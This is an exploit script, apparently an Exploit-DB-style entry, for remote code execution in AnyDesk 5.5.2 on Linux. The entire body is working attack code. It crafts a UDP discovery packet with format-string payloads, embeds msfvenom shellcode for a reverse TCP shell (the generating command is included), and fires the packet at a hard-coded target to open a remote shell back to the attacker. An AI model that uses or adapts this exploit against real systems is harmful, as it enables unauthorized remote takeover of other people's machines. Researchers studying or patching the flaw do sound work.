# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881
 
#!/usr/bin/env python
import struct
import socket
import sys
 
ip = '10.0.6.52'
port = 50001
 
def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])
    d += struct.pack('>I', len(hn)) + hn.encode('latin1')
    d += struct.pack('>I', len(user)) + user.encode('latin1')
    d += struct.pack('>I', 0)
    d += struct.pack('>I', len(inf)) + inf.encode('latin1')
    d += bytes([0])
    d += struct.pack('>I', len(func)) + func.encode('latin1')
    d += bytes([0x2, 0xc3, 0x51])
    return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
 
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x71\x32\xee"
shellcode += b"\xd2\x17\x7d\x3a\xc4\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x1b\x1b\xb6\x4b\x7d"
shellcode += b"\x7f\x65\xae\x70\x6c\xe1\xd7\x5f\xea\x72\x7d"
shellcode += b"\x73\x32\xf4\xd8\x1d\x7d\x3c\xf6\x20\x7a\x67"
shellcode += b"\x34\x7d\x6d\x60\xae\x5b\x6a\xe1\xd7\x7d\x7e"
shellcode += b"\x64\x8c\x8e\xfc\x84\xf3\x4f\x72\x3f\xb1\x87"
shellcode += b"\x58\xd5\x8a\x8e\x35\x81\xeb\x13\x5b\x80\xfd"
shellcode += b"\x64\x15\x3a\x97\x39\xbb\x09\x80\x40\x35\xb3"
shellcode += b"\x22\x7e\x37\xee\xd2\x17\x7d\x3a\xc4"

shellcode_str = "".join([chr(b) for b in shellcode])  # Convert bytes to a string
 
print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln' + shellcode_str, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
